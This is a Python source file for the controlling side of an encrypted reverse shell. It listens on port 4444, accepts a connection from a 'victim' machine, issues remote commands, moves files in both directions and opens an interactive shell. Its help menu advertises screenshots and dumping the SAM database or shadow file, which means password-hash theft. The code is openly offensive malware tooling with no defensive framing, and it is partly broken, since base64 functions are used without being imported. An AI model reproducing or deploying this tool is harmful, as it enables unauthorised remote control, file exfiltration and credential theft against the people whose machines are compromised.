import socket
import os
from aes_crypt import AESCipher

class ReverseShellServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = None

    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(1)
        print(f"Listening on {self.host}:{self.port}...")
        self.conn, addr = s.accept()
        print(f"Connection from {addr}")
        self.handle_client()

    def handle_client(self):
        try:
            while True:
                command = input("Shell> ")
                if command.lower() == 'help':
                    self.show_help()
                elif command.lower().startswith('download'):
                    self.handle_download(command)
                elif command.lower().startswith('upload'):
                    self.handle_upload(command)
                elif command.lower() == 'shell':
                    self.interactive_shell()
                else:
                    self.send_command(command)
        finally:
            self.conn.close()

    def show_help(self):
        print("\nAvailable Commands:")
        print("help         : Show this help message")
        print("download     : Download files from the victim to the server")
        print("upload       : Upload files from the server to the victim")
        print("shell        : Open an interactive shell (bash or cmd)")
        print("ipconfig     : Get the network configuration of the victim machine")
        print("screenshot   : Take a screenshot of the victim machine")
        print("search       : Search for a file on the victim machine")
        print("hashdump     : Retrieve the SAM database or shadow file from the victim machine\n")

    def handle_download(self, command):
        try:
            file_path = command.split(' ', 1)[1]
        except IndexError:
            print("Error: 'download' command requires a file path")
            return
        self.conn.send(AESCipher.encrypt(command).encode('utf-8'))
        try:
            with open(file_path, 'wb') as f:
                while True:
                    data = self.conn.recv(4096).decode('utf-8')
                    decrypted_data = AESCipher.decrypt(data)
                    if decrypted_data == 'EOF':
                        break
                    f.write(b64decode(decrypted_data))
            print(f"File {file_path} downloaded successfully.")
        except Exception as e:
            print(f"Failed to download {file_path}: {e}")

    def handle_upload(self, command):
        try:
            file_path = command.split(' ', 1)[1]
        except IndexError:
            print("Error: 'upload' command requires a file path")
            return
        self.conn.send(AESCipher.encrypt(command).encode('utf-8'))
        try:
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(AESCipher.encrypt(b64encode(chunk).decode('utf-8')).encode('utf-8'))
            self.conn.send(AESCipher.encrypt('EOF').encode('utf-8'))
            print(f"File {file_path} uploaded successfully.")
        except Exception as e:
            print(f"Failed to upload {file_path}: {e}")
            self.conn.send(AESCipher.encrypt('ERROR').encode('utf-8'))

    def interactive_shell(self):
        while True:
            shell_command = input("Shell (type 'exit' to return)> ")
            if shell_command.lower() == 'exit':
                break
            if shell_command:
                self.send_command(shell_command)

    def send_command(self, command):
        self.conn.send(AESCipher.encrypt(command).encode('utf-8'))
        data = self.conn.recv(4096).decode('utf-8')
        if data:
            print(AESCipher.decrypt(data))

if __name__ == '__main__':
    server = ReverseShellServer('0.0.0.0', 4444)
    server.start()
